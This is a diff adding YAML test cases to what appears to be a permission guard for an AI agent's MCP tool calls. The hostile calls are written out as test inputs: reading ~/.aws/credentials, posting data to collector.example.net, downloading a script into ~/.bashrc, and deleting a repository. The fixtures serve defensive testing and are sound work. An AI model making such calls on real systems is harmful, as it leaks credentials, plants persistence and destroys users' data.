@@ -31,3 +31,37 @@
     the agent's own prompt decides (ADR-025).
   steps:
     - { mcp: { server: runner, tool: run_command, args: { command: "make deploy" } }, expect: defer }
+
+- id: mcp-secret-path-nested-in-arguments
+  threat: T8
+  why: >-
+    The path is three levels down, under a camel-case key, as a custom server takes it: the
+    arguments are searched by key at every level, so the secret-path rule still decides.
+  steps:
+    - { mcp: { server: custom, tool: run, args: { options: { inputs: [{ sourcePath: "~/.aws/credentials" }] } } }, expect: deny, rule: secrets-paths }
+
+- id: mcp-callback-url-to-unknown-host
+  threat: T8
+  why: >-
+    A server that posts results to a URL the call names: any key ending in `_url` is a host
+    the call contacts, decided by the network rules like a fetch.
+  steps:
+    - { mcp: { server: notify, tool: send_report, args: { callback_url: "https://collector.example.net/hook", body: "build log" } }, expect: deny, rule: default.net }
+
+- id: mcp-download-into-a-startup-file
+  threat: T8
+  why: >-
+    `download` in the tool's name makes its path a write: a download into ~/.bashrc is the same
+    persistence as a shell append.
+  steps:
+    - { mcp: { server: web, tool: download_file, args: { url: "https://github.com/acme/app/raw/main/x.sh", path: "~/.bashrc" } }, expect: deny, rule: shell-rc }
+
+- id: mcp-destructive-tool-is-left-to-the-agent
+  threat: T8
+  why: >-
+    A tool that deletes a repository is not on the safe list by name and names no file or
+    host: the agent's own prompt decides it (ADR-025). A deny rule group naming it
+    (`mcp: ["mcp__github__delete_repo"]`) denies it, at the hook and again at
+    `openmoat mcp proxy`, which decides on the arguments the server receives (ADR-045).
+  steps:
+    - { mcp: { server: github, tool: delete_repo, args: { owner: acme, repo: app } }, expect: defer }
